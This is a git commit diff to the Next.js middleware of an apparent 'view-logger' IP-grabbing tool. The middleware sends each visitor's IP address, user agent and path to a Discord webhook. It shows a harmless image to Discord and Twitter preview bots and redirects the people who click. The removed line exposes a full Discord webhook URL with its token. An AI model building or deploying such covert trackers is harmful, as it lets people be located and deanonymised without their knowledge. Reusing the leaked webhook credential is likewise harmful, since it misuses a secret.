83fb80e24f5ba9a14af321d3eeec4a5e4a6765a7
RyfterWasTaken <144800123+RyfterWasTaken@users.noreply.github.com>
2024-03-13 14:05:05 +0100

    Stopped showing favicon/vercel hits

--- middleware.js
+++ middleware.js
@@ -1,26 +1,29 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = "https://discord.com/api/webhooks/1216820645711843478/QRIgnJF2GR6zofyQsdCMJ3uD6ALwtO-tK73SHh-5HGitJmh9u6T-aRF1uic_PrPiBXcD" // The URL of your Discord/Guilded webhook
+const webhook = "WEBHOOK URL HERE" // The URL of your Discord/Guilded webhook
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
   const discordbot = ["Mozilla/5.0 (compatible; Discordbot/", "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0", "Twitterbot/"].find(u=>ua?.startsWith(u));
-  const vercelbot = ua?.startsWith("Vercelbot/");
+  const vercelbot = ["vercel-", "Vercelbot/"].find(u => ua?.startsWith(u));
   const path = req.nextUrl.pathname;
+  const favicon = path.startsWith("/favicon");
   const img = req.nextUrl.searchParams.get('img') ? new URL(req.nextUrl.searchParams.get('img')) : new URL("/mini.png", req.url);
   const redirect = req.nextUrl.searchParams.get('red');
   const body = {
     "embeds":[{
       "title":"Triggered view-logger V2",
-      "fields":[{name:"Source", value:(discordbot ? "discord" : vercelbot ? "Vercel" : "User"), inline: true},{name:"Path", value: path, inline: true},{name:"IP", value: req.ip, inline: true}, {name: "User agent", value: ua, inline: false}]
+      "fields":[{name:"Source", value:(discordbot ? "Discord" : vercelbot ? "Vercel" : favicon ? "Favicon" : "User"), inline: true},{name:"Path", value: path, inline: true},{name:"IP", value: req.ip, inline: true}, {name: "User agent", value: ua, inline: false}]
     }],
   };
-  await fetch(webhook,{body: JSON.stringify(body), headers:{"content-type":"application/json"}, method:"POST"})
-  if(discordbot||vercelbot){
-    // Return the image.
-    return NextResponse.rewrite(img)
-  }else{
-    // Make a message for whoever takes the risk to directly click.
-    return redirect ? NextResponse.redirect(new URL(redirect)) : NextResponse.rewrite(new URL("/page.html", req.url));
+  if(!(favicon||vercelbot)){
+    await fetch(webhook,{body: JSON.stringify(body), headers:{"content-type":"application/json"}, method:"POST"})
+    if(discordbot||vercelbot){
+      // Return the image.
+      return NextResponse.rewrite(img)
+    }else{
+      // Make a message for whoever takes the risk to directly click.
+      return redirect ? NextResponse.redirect(new URL(redirect)) : NextResponse.rewrite(new URL("/page.html", req.url));
+    }
   }
 }
